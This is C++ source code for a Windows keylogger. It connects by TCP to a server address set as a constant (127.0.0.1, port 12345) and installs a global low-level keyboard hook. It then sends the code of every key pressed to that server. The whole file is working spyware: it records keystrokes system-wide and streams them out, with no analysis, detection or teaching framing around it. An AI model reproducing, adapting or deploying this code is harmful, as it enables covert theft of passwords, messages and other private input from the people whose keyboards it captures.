#include <iostream>
#include <winsock2.h>
#include <string>
#include <Windows.h>

#pragma comment(lib, "Ws2_32.lib")

const int SERVER_PORT = 12345;
const std::string SERVER_ADDRESS = "127.0.0.1";

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
SOCKET client_socket;

int main()
{
    // Initialize Winsock
    WSADATA wsa_data;
    int result = WSAStartup(MAKEWORD(2, 2), &wsa_data);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return 1;
    }

    // Create a socket
    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client_socket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Connect to server
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_ADDRESS.c_str(), &server_addr.sin_addr.s_addr);

    result = connect(client_socket, (sockaddr*)&server_addr, sizeof(server_addr));
    if (result == SOCKET_ERROR) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    // Install the keyboard hook
    HHOOK keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboard_hook == NULL) {
        std::cerr << "Keyboard hook installation failed" << std::endl;
        closesocket(client_socket);
        WSACleanup();
        return 1;
    }

    // Message loop to keep the program running and processing the hook
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(keyboard_hook);
    closesocket(client_socket);
    WSACleanup();

    return 0;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboardStruct = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            // Get the key as a string
            std::string key = std::to_string(pKeyboardStruct->vkCode);

            // Send the key to the server
            int result = send(client_socket, key.c_str(), key.length(), 0);
            if (result == SOCKET_ERROR) {
                std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            }
        }
    }

    // Call the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
